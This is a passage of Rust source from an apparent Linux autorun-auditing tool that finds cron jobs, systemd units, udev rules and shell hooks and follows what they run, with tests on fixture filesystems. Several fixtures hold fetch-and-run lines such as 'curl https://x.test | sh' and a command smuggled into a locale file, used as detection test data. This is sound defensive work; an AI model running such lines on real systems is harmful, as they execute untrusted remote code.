        for part in parts {
            for target in lookup.targets(&part) {
                if !targets.contains(&target) {
                    targets.push(target);
                }
            }
        }
        if lookup.capped.get() {
            limit(format!(
                "only the first {} commands of a line",
                commands::MAX_INNER_COMMANDS
            ));
        }
    }
    let under =
        |places: &[&str], target: &str| places.iter().any(|place| target.starts_with(place));
    let targets = targets
        .into_iter()
        .filter(|target| {
            if under(FILES_ONLY, target) {
                is_file_there(scope, target, by)
            } else {
                !under(NOT_FOLLOWED, target)
            }
        })
        .filter_map(|target| match view {
            // The path the pinned walk took, not one resolved again.
            Some(view) => read::seen(scope.root, &target, view).map(|seen| seen.path),
            None => read::canonical(scope.root, &target),
        })
        .collect();
    Followed {
        targets,
        unfollowed,
    }
}

/// The home directory of `user`, relative to the root, from `/etc/passwd`.
fn user_home(root: &Path, user: &str) -> Option<String> {
    fs::read_to_string(root.join("etc/passwd"))
        .ok()?
        .lines()
        .find_map(|line| {
            let fields: Vec<&str> = line.split(':').collect();
            (fields.first() == Some(&user))
                .then(|| {
                    fields
                        .get(5)
                        .map(|home| home.trim_start_matches('/').to_string())
                })
                .flatten()
        })
        .filter(|home| !home.is_empty())
}

/// Absolute paths mentioned in Omarchy's installer scripts.
fn omarchy_paths(root: &Path) -> HashSet<String> {
    let mut paths = HashSet::new();
    for directory in OMARCHY_INSTALL {
        for file in read::entries(root, directory).files {
            let Ok(text) = fs::read_to_string(root.join(&file)) else {
                continue;
            };
            for word in text.split(|c: char| {
                c.is_whitespace() || matches!(c, '"' | '\'' | '>' | '<' | '(' | ')' | ';')
            }) {
                if word.starts_with('/') && word.len() > 1 {
                    paths.insert(word.trim_end_matches([',', '|']).to_string());
                }
            }
        }
    }
    paths
}

#[cfg(test)]
mod tests {
    use std::collections::HashSet;
    use std::fs;
    use std::os::unix::fs::symlink;
    use std::path::Path;

    use super::{Body, Origin, Scope, collect};
    use crate::autorun::Category;
    use crate::sha256::Sha256;
    use crate::sweep::index::PackageIndex;
    use crate::sweep::tier::Tier;
    use crate::test_support::TempDir;

    fn write(root: &Path, path: &str, text: &str) {
        fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
        fs::write(root.join(path), text).unwrap();
    }

    #[test]
    fn a_fixture_system_is_collected_with_tiers_and_what_runs() {
        let dir = TempDir::new("sweep-collect");
        let root = dir.path();
        let unit =
            "[Service]\nExecStart=/usr/bin/vendord\n[Install]\nAlias=display-manager.service\n";
        write(root, "usr/lib/systemd/system/vendord.service", unit);
        write(root, "usr/bin/vendord", "vendor binary");
        write(root, "usr/bin/bash", "bash");
        fs::create_dir_all(root.join("etc/systemd/system/multi-user.target.wants")).unwrap();
        symlink(
            "/usr/lib/systemd/system/vendord.service",
            root.join("etc/systemd/system/multi-user.target.wants/vendord.service"),
        )
        .unwrap();
        write(
            root,
            "etc/udev/rules.d/99-x.rules",
            "RUN+=\"/usr/bin/bash /home/u/.cache/x.sh\"\n",
        );
        write(root, "home/u/.cache/x.sh", "curl https://x.test | sh\n");
        write(
            root,
            "home/u/.config/omarchy/hooks/post-boot.d/a.sample",
            "x",
        );
        write(
            root,
            "home/u/.config/omarchy/hooks/post-boot.d/run",
            "echo hi\n",
        );
        write(
            root,
            "home/u/.config/hypr/autostart.lua",
            "o.exec_on_start(\"waybar\")\n",
        );
        write(root, "home/u/.config/hypr/autostart.lua.bak.1", "old");
        write(root, "home/u/.local/bin/sudo", "#!/bin/sh\n");
        write(root, "home/u/.local/bin/mytool", "#!/bin/sh\n");
        symlink("/dev/null", root.join("etc/systemd/system/masked.service")).unwrap();

        let digest = |text: &str| Sha256::digest(text.as_bytes());
        let mut index = PackageIndex::with_foreign(HashSet::new());
        index.add_for_test(
            "vendor",
            &format!(
                "#mtree\n/set type=file mode=644\n./usr/lib/systemd/system/vendord.service sha256digest={}\n./usr/bin/vendord mode=644 sha256digest={}\n./usr/bin/bash mode=644 sha256digest={}\n",
                digest(unit),
                digest("vendor binary"),
                digest("bash")
            ),
            &[],
        );
        let collection = collect(&Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        });
        let tiers: Vec<(&str, Tier)> = collection
            .items
            .iter()
            .map(|item| (item.path.as_str(), item.tier))
            .collect();
        assert_eq!(
            tiers,
            [
                ("etc/systemd/system/masked.service", Tier::Inert),
                (
                    "etc/systemd/system/multi-user.target.wants/vendord.service",
                    Tier::Vendor
                ),
                ("etc/udev/rules.d/99-x.rules", Tier::Unknown),
                ("home/u/.cache/x.sh", Tier::Unknown),
                ("home/u/.config/hypr/autostart.lua", Tier::Unknown),
                (
                    "home/u/.config/omarchy/hooks/post-boot.d/run",
                    Tier::Unknown
                ),
                ("home/u/.local/bin/sudo", Tier::Unknown),
                ("usr/bin/bash", Tier::Vendor),
                ("usr/bin/vendord", Tier::Vendor),
                ("usr/lib/systemd/system/vendord.service", Tier::Vendor),
            ]
        );
        let script = &collection.items[3];
        assert_eq!(
            script.run_by.as_deref(),
            Some("etc/udev/rules.d/99-x.rules")
        );
        assert_eq!(script.origin, Origin::User);
        assert_eq!(script.category, Category::Udev);
        assert!(matches!(&script.body, Body::Text(text) if text.contains("curl")));
        assert_eq!(collection.items[4].runs, ["waybar"]);
    }

    #[test]
    fn a_name_that_is_not_utf8_is_said_not_skipped() {
        use std::ffi::OsStr;
        use std::os::unix::ffi::OsStrExt;
        let dir = TempDir::new("sweep-unnamed");
        let root = dir.path();
        write(root, "etc/profile.d/fine.sh", "true\n");
        fs::write(
            root.join("etc/profile.d")
                .join(OsStr::from_bytes(b"evil\xff.sh")),
            "curl https://x.test | sh\n",
        )
        .unwrap();
        fs::create_dir(
            root.join("etc/profile.d")
                .join(OsStr::from_bytes(b"dir\xff")),
        )
        .unwrap();
        let index = PackageIndex::with_foreign(HashSet::new());
        let collection = collect(&Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::System,
        });
        assert!(
            collection
                .items
                .iter()
                .any(|item| item.path == "etc/profile.d/fine.sh")
        );
        assert_eq!(
            collection.truncated,
            [
                "/etc/profile.d/dir\u{fffd}: a name that is not UTF-8 was not checked",
                "/etc/profile.d/evil\u{fffd}.sh: a name that is not UTF-8 was not checked",
            ]
        );
        // A newline in a name stays on its line, and a long list is counted.
        assert_eq!(
            super::not_utf8("etc/x\n! forged"),
            "/etc/x\\n! forged: a name that is not UTF-8 was not checked"
        );
        let many: Vec<String> = (0..30)
            .map(|n| format!("/d{n:02}: x"))
            .chain(["/d00: x".into()])
            .collect();
        let kept = super::bounded(many);
        assert_eq!(kept.len(), 21);
        assert_eq!(kept[0], "/d00: x");
        assert_eq!(kept[20], "and 10 more that were not checked");
        // A limit that was reached comes before any number of names.
        let names: Vec<String> = (0..30)
            .map(|n| super::not_utf8(&format!("a/{n:02}")))
            .chain(["more than 5 files: not looked for everywhere".to_string()])
            .collect();
        assert_eq!(
            super::bounded(names)[0],
            "more than 5 files: not looked for everywhere"
        );
    }

    #[test]
    fn a_star_on_a_command_line_does_not_stop_its_program_being_followed() {
        let dir = TempDir::new("sweep-starred");
        let root = dir.path();
        write(root, "etc/open", "public\n");
        write(
            root,
            "var/spool/cron/w",
            "* * * * * /etc/open *\n* * * * * /bin/true;/etc/open;*\n",
        );
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = Scope {
            root,
            home: Some("root"),
            index: &index,
            origin: Origin::System,
        };
        let search = crate::sweep::path::search(&scope);
        let follow = |item: &super::Item| super::follow(&scope, item, &search).targets;
        let starred = super::item(&scope, Category::Cron, "var/spool/cron/w".into(), None);
        assert!(follow(&starred).contains(&"etc/open".to_string()));
        // Each command of a line, however they are joined.
        write(root, "etc/second", "x\n");
        write(root, "etc/third", "x\n");
        write(
            root,
            "var/spool/cron/x",
            "* * * * * /bin/true;/etc/second && /etc/third | cat\n",
        );
        let joined = super::item(&scope, Category::Cron, "var/spool/cron/x".into(), None);
        let followed = follow(&joined);
        for path in ["etc/second", "etc/third"] {
            assert!(followed.contains(&path.to_string()), "{followed:?}");
        }
        // A line with more commands than are looked up says so, and so
        // does a file with a line too long to look through.
        let many = format!(
            "* * * * * {}/etc/second\n",
            "true;".repeat(crate::sweep::commands::MAX_INNER_COMMANDS)
        );
        write(root, "var/spool/cron/y", &many);
        let long = super::item(&scope, Category::Cron, "var/spool/cron/y".into(), None);
        let followed = super::follow(&scope, &long, &search);
        assert!(!followed.targets.contains(&"etc/second".to_string()));
        assert_eq!(
            followed.unfollowed,
            ["only the first 1024 commands of a line"]
        );
        write(
            root,
            "home/u/.bashrc",
            &format!("true {}\n~/bin/agent &\n", "x".repeat(70 * 1024)),
        );
        let shell = super::item(&scope, Category::Shell, "home/u/.bashrc".into(), None);
        assert!(super::is_capped(&shell), "{:?}", shell.notes);
        assert_eq!(shell.runs, ["~/bin/agent"]);
        assert!(!super::is_capped(&joined));
    }

    #[test]
    fn root_only_looks_where_a_user_points_if_the_user_could_too() {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        let dir = TempDir::new("sweep-steered");
        let root = dir.path();
        // Run as root (a container), every file here is root's own, which
        // nobody else steers: there is no user to play.
        if fs::metadata(root).unwrap().uid() == 0 {
            return;
        }
        write(root, "var/spool/cron/u", "* * * * * /etc/secret\n");
        write(root, "etc/secret", "pin 1234\n");
        write(root, "etc/open", "public\n");
        write(root, "root/private/key", "key\n");
        symlink("/etc/secret", root.join("etc/link")).unwrap();
        let mode = |path: &str, mode: u32| {
            fs::set_permissions(root.join(path), fs::Permissions::from_mode(mode)).unwrap();
        };
        mode("etc/secret", 0o600);
        mode("root/private", 0o700);
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = |origin| Scope {
            root,
            home: Some("root"),
            index: &index,
            origin,
        };
        let by = Some("var/spool/cron/u");
        let as_root = scope(Origin::Root);
        let follow_as = |scope: &Scope<'_>, item: &super::Item| {
            super::follow(scope, item, &crate::sweep::path::search(scope)).targets
        };
        // What the crontab line leads to is not even looked for.
        let crontab = super::item(&as_root, Category::Cron, "var/spool/cron/u".into(), None);
        assert_eq!(crontab.runs, ["/etc/secret"]);
        assert!(follow_as(&as_root, &crontab).is_empty());
        write(root, "var/spool/cron/v", "* * * * * /etc/open\n");
        let open_crontab = super::item(&as_root, Category::Cron, "var/spool/cron/v".into(), None);
        assert_eq!(follow_as(&as_root, &open_crontab), ["etc/open"]);
        // Nor where a user's link leads, directly or through a link only
        // root can see.
        let user_link = super::item(&as_root, Category::Cron, "etc/link".into(), by);
        assert!(follow_as(&as_root, &user_link).is_empty());
        symlink("/etc/open", root.join("root/private/hop")).unwrap();
        symlink("/root/private/hop", root.join("etc/chain")).unwrap();
        let chain = super::item(&as_root, Category::Cron, "etc/chain".into(), by);
        assert_eq!(chain.body, Body::Link("/root/private/hop".into()));
        assert!(follow_as(&as_root, &chain).is_empty());
        assert_eq!(follow_as(&scope(Origin::System), &chain), ["etc/open"]);
        // The user's own sweep follows both.
        let as_user = scope(Origin::System);
        assert_eq!(follow_as(&as_user, &crontab), ["etc/secret"]);

        // Named by a user's crontab: what only root can read is not looked
        // at, and one that is not there looks the same.
        for path in ["etc/secret", "root/private/key", "etc/missing"] {
            let found = super::item(&as_root, Category::Cron, path.into(), by);
            assert_eq!(
                found.body,
                Body::Unreadable(super::NOT_LOOKED_AT.into()),
                "{path}"
            );
            assert_eq!(found.sha256, None, "{path}");
        }
        // The same for what a process names (a live check).
        let live = super::item(&as_root, Category::Process, "etc/secret".into(), None);
        assert_eq!(live.body, Body::Unreadable(super::NOT_LOOKED_AT.into()));
        // What everyone may read is hashed as before, and a link says
        // where it leads.
        let open = super::item(&as_root, Category::Cron, "etc/open".into(), by);
        assert_eq!(open.body, Body::Binary(super::WITHHELD));
        assert!(open.sha256.is_some());
        let link = super::item(&as_root, Category::Cron, "etc/link".into(), by);
        assert_eq!(link.body, Body::Link("/etc/secret".into()));
        // An auto-run location's own file, and the user's own sweep, are
        // not affected.
        let direct = super::item(&as_root, Category::Cron, "etc/secret".into(), None);
        assert!(matches!(direct.body, Body::Text(_)));
        let own = super::item(
            &scope(Origin::System),
            Category::Cron,
            "etc/secret".into(),
            by,
        );
        assert!(matches!(own.body, Body::Text(_)));

        assert!(super::is_there(&as_root, "etc/open", by));
        assert!(!super::is_there(&as_root, "etc/secret", by));
        // A directory a command names is not a program it runs.
        fs::create_dir_all(root.join("etc/named.d")).unwrap();
        assert!(!super::is_there(&as_root, "etc/named.d", by));
        assert!(!super::is_there(
            &scope(Origin::System),
            "etc/named.d",
            None
        ));
        // A link is not the file it leads to, in the guarded view.
        symlink("open", root.join("etc/beside")).unwrap();
        assert!(!super::is_file_there(&as_root, "etc/beside", None));
        assert!(super::is_file_there(
            &scope(Origin::System),
            "etc/beside",
            None
        ));
        assert!(super::is_file_there(&as_root, "etc/open", None));
        // A command through a link on the way: followed where nobody else
        // could have put the link, and told by the path really taken.
        symlink("etc", root.join("conf")).unwrap();
        fs::create_dir_all(root.join("tmp")).unwrap();
        symlink("../etc", root.join("tmp/conf")).unwrap();
        mode("tmp", 0o777);
        write(
            root,
            "var/spool/cron/w",
            "* * * * * /conf/open\n* * * * * /tmp/conf/open\n",
        );
        let through = super::item(&as_root, Category::Cron, "var/spool/cron/w".into(), None);
        assert_eq!(follow_as(&as_root, &through), ["etc/open"]);
        assert!(!super::is_there(&as_root, "tmp/conf/open", by));
        assert!(super::user_steered(root, None));
        // Not root's file: whoever owns it decides what it names.
        assert!(super::user_steered(root, by));
    }

    #[test]
    fn a_link_takes_its_units_trust_only_under_a_name_the_unit_declares() {
        let dir = TempDir::new("sweep-alias");
        let root = dir.path();
        let unit = "[Service]\nExecStart=/usr/bin/true\n[Install]\nAlias=display-manager.service\n";
        write(root, "usr/lib/systemd/system/sddm.service", unit);
        fs::create_dir_all(root.join("etc/systemd/system")).unwrap();
        for name in ["display-manager.service", "getty.service"] {
            symlink(
                "/usr/lib/systemd/system/sddm.service",
                root.join("etc/systemd/system").join(name),
            )
            .unwrap();
        }
        let mut index = PackageIndex::with_foreign(HashSet::new());
        index.add_for_test(
            "sddm",
            &format!(
                "#mtree\n./usr/lib/systemd/system/sddm.service type=file mode=644 sha256digest={}\n",
                Sha256::digest(unit.as_bytes())
            ),
            &[],
        );
        let collection = collect(&Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::System,
        });
        let tier = |path: &str| {
            collection
                .items
                .iter()
                .find(|item| item.path == path)
                .map(|item| item.tier)
        };
        assert_eq!(
            tier("etc/systemd/system/display-manager.service"),
            Some(Tier::Vendor)
        );
        assert_eq!(
            tier("etc/systemd/system/getty.service"),
            Some(Tier::Unknown)
        );
    }

    #[test]
    fn devices_and_kernel_files_are_not_followed_and_a_plain_locale_file_is_quiet() {
        let dir = TempDir::new("sweep-not-followed");
        let root = dir.path();
        // What a command writes to is no program it runs.
        write(
            root,
            "etc/profile.d/tidy.sh",
            "strip --list-file /dev/stdout \"$1\"\ncat /proc/version /sys/x </run/sock >/dev/null\n/dev/shm/payload\n/run/user/1000/payload\n. /etc/locale.conf\n",
        );
        for path in [
            "dev/stdout",
            "dev/shm/payload",
            "proc/version",
            "sys/x",
            "run/user/1000/payload",
        ] {
            write(root, path, "x\n");
        }
        std::os::unix::net::UnixListener::bind(root.join("run/sock")).unwrap();
        write(
            root,
            "etc/locale.conf",
            "# the locale\nLANG=en_US.UTF-8\nLC_TIME=\"de_DE.UTF-8\"\n",
        );
        write(
            root,
            "home/u/.config/mimeapps.list",
            "[Default Applications]\n",
        );
        write(
            root,
            "usr/share/applications/mimeapps.list",
            "[Default Applications]\n",
        );
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        };
        let collection = collect(&scope);
        let find = |path: &str| collection.items.iter().find(|item| item.path == path);
        for path in ["dev/stdout", "proc/version", "sys/x", "run/sock"] {
            assert!(find(path).is_none(), "{path}");
        }
        // A program in memory a user fills, or in a runtime directory, is
        // a program all the same.
        for path in ["dev/shm/payload", "run/user/1000/payload"] {
            assert!(find(path).is_some(), "{path}");
        }
        // The locale file is listed, and not as something to look at.
        let locale = find("etc/locale.conf").unwrap();
        assert_eq!(locale.tier, Tier::Inert);
        assert!(locale.is_trusted());
        // The list of handlers replaces no launcher.
        let handlers = find("home/u/.config/mimeapps.list").unwrap();
        assert!(handlers.notes.is_empty(), "{:?}", handlers.notes);
        // One that does more than name a language is an item like any.
        for text in [
            "LANG=en_US.UTF-8\nPATH=/tmp/x:$PATH\n",
            "LANG=$(curl x)\n",
            "LANG=C; /tmp/x\n",
        ] {
            write(root, "etc/locale.conf", text);
            let collection = collect(&scope);
            let locale = collection
                .items
                .iter()
                .find(|item| item.path == "etc/locale.conf")
                .unwrap();
            assert_eq!(locale.tier, Tier::Unknown, "{text}");
        }
    }

    #[test]
    fn a_user_crontab_runs_from_that_users_home() {
        let dir = TempDir::new("sweep-crontab");
        let root = dir.path();
        write(
            root,
            "etc/passwd",
            "root:x:0:0::/root:/bin/bash\nu:x:1000:1000::/home/u:/bin/bash\n",
        );
        write(root, "var/spool/cron/u", "@reboot ~/x.sh\n");
        write(root, "home/u/x.sh", "curl x | sh\n");
        write(root, "root/x.sh", "root's\n");
        // A queued `at` job, in whichever spool: told by its hash, with
        // the environment it carries left where it is.
        for spool in ["var/spool/atd", "var/spool/at", "var/spool/cron/atjobs"] {
            write(
                root,
                &format!("{spool}/a0000101"),
                "#!/bin/sh\nTOKEN=hunter2; export TOKEN\n/home/u/x.sh\n",
            );
        }
        let index = PackageIndex::with_foreign(HashSet::new());
        let collection = collect(&Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::System,
        });
        assert!(
            collection
                .items
                .iter()
                .any(|item| item.path == "home/u/x.sh")
        );
        assert!(!collection.items.iter().any(|item| item.path == "root/x.sh"));
        let jobs: Vec<_> = collection
            .items
            .iter()
            .filter(|item| super::is_at_job(&item.path))
            .collect();
        assert_eq!(jobs.len(), 3);
        for job in jobs {
            assert_eq!(job.body, Body::Binary(super::WITHHELD), "{}", job.path);
            assert!(job.runs.is_empty() && job.sha256.is_some(), "{}", job.path);
        }
    }
}
